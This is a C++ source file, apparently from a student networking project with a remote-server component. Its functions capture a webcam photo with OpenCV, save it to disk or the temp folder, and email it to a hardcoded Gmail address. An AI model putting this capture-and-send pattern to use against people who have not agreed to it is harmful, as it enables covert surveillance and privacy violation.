#include "sendPicture.h"

void take_picture(const std::string& outFilePath) {
  namespace fs = std::filesystem;

  // Tạo thư mục nếu chưa có
  fs::create_directories(fs::path(outFilePath).parent_path());

  // Sử dụng OpenCV để chụp ảnh
  cv::VideoCapture cap(0);
  if (!cap.isOpened()) {
    cerr << "[Server] Failed to open webcam!" << endl;
    return;
  }

  // Set camera properties for better quality
  cap.set(cv::CAP_PROP_FRAME_WIDTH, 1280);
  cap.set(cv::CAP_PROP_FRAME_HEIGHT, 720);

  cv::Mat frame;

  // Try multiple times to get a valid frame
  int attempts = 0;
  const int max_attempts = 5;

  do {
    cap >> frame;
    if (!frame.empty()) break;

    attempts++;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
  } while (attempts < max_attempts);

  cap.release();

  if (frame.empty()) {
    cerr << "[Server] Failed to capture image after " << max_attempts
         << " attempts!" << endl;
    return;
  }

  // Save image to file
  bool saved = cv::imwrite(outFilePath, frame);
  if (!saved) {
    cerr << "[Server] Failed to save image to: " << outFilePath << endl;
    return;
  }

  cout << "[Server] Picture saved to: " << fs::absolute(outFilePath) << endl;
}

void send_picture() {
  char temp_path[MAX_PATH];
  GetTempPathA(MAX_PATH, temp_path);

  string image_path = string(temp_path) + "captured_photo.jpg";

  // Open default camera (0)
  cv::VideoCapture cap(0);
  if (!cap.isOpened()) {
    cerr << "Failed to open webcam!" << endl;
    return;
  }

  cv::Mat frame;
  cap >> frame;

  if (frame.empty()) {
    cerr << "Failed to capture image!" << endl;
    return;
  }

  // Save image to file
  bool saved = cv::imwrite(image_path, frame);
  if (!saved) {
    cerr << "Failed to save image!" << endl;
    return;
  }
  cout << "Image saved successfully to: " << image_path << endl;

  // Send it via email
  send_email_with_attachment("serverbottestmmt@gmail.com", "Webcam Photo",
                             "Here is a photo taken from the webcam.",
                             image_path);
}